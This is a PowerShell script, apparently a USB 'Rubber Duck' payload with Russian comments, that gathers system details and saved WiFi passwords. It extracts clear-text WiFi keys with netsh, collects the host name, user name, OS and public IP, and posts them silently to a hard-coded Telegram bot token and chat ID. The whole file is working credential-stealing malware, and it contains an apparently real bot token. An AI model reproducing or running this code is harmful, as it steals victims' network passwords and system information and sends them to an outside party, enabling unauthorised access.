<#
.SYNOPSIS
    Rubber Duck Data Collector - Stable Version
.DESCRIPTION
    Собирает системную информацию и пароли WiFi, отправляет в Telegram
.NOTES
    Репозиторий: https://github.com/OGRYZOK-dev/RubberDuck
#>

# Конфигурация
$TOKEN = "6942623726:AAH6yXcm9EgAhbUVxCmphZF3o6H8XScPOFw"
$CHAT_ID = "6525689863"

function Send-TelegramNotification {
    param([string]$Message)
    
    $url = "https://api.telegram.org/bot$TOKEN/sendMessage"
    $body = @{
        chat_id = $CHAT_ID
        text = $Message
        disable_notification = $true
    }
    
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body ($body | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
        return $true
    }
    catch {
        Write-Output "[Telegram Error] $_"
        return $false
    }
}

function Get-SystemInformation {
    $info = @(
        "🖥️ System Information",
        "Computer: $env:COMPUTERNAME",
        "User: $env:USERNAME",
        "OS: $([System.Environment]::OSVersion.VersionString)",
        "PowerShell: $($PSVersionTable.PSVersion)",
        "Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')",
        "IP: $(try {(Invoke-WebRequest -Uri 'https://api.ipify.org' -TimeoutSec 3).Content} catch {'Unknown'})"
    )
    return $info -join "`n"
}

function Get-WiFiCredentials {
    try {
        $profiles = @()
        $wifiData = netsh wlan show profiles | Where-Object { $_ -match "All User Profile" }
        
        foreach ($profile in $wifiData) {
            $name = $profile.Split(":")[1].Trim()
            $password = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()
            $profiles += "📶 WiFi: $name"
            $profiles += "🔑 Password: $password"
            $profiles += "---------------------"
        }
        
        if ($profiles.Count -eq 0) { return "No WiFi profiles found" }
        return $profiles -join "`n"
    }
    catch {
        return "[WiFi Error] $_"
    }
}

# Основной сбор данных
try {
    $report = @()
    $report += Get-SystemInformation
    $report += "`n`n🔐 WiFi Passwords:`n" + (Get-WiFiCredentials)
    
    # Отправка отчета
    if ($report.Length -gt 4096) {
        $report = $report.Substring(0, 4090) + "..."
    }
    
    Send-TelegramNotification -Message $report
    Write-Output "Data sent successfully"
}
catch {
    $errorMsg = "[Main Error] $_"
    Write-Output $errorMsg
    Send-TelegramNotification -Message $errorMsg
}
